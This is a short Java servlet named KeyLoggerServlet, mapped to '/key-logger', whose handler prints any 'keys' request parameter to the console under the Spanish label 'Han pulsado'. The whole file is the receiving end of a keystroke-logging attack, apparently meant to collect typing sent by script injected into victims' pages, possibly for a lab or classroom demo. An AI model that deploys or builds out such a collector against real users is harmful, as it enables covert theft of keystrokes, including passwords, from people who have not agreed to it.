import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/key-logger")
public class KeyLoggerServlet extends HttpServlet {
	
	public void doGet(HttpServletRequest req, HttpServletResponse res) {
		String keys = req.getParameter("keys");
		System.out.println("------> Han pulsado: " + keys);
	}
}
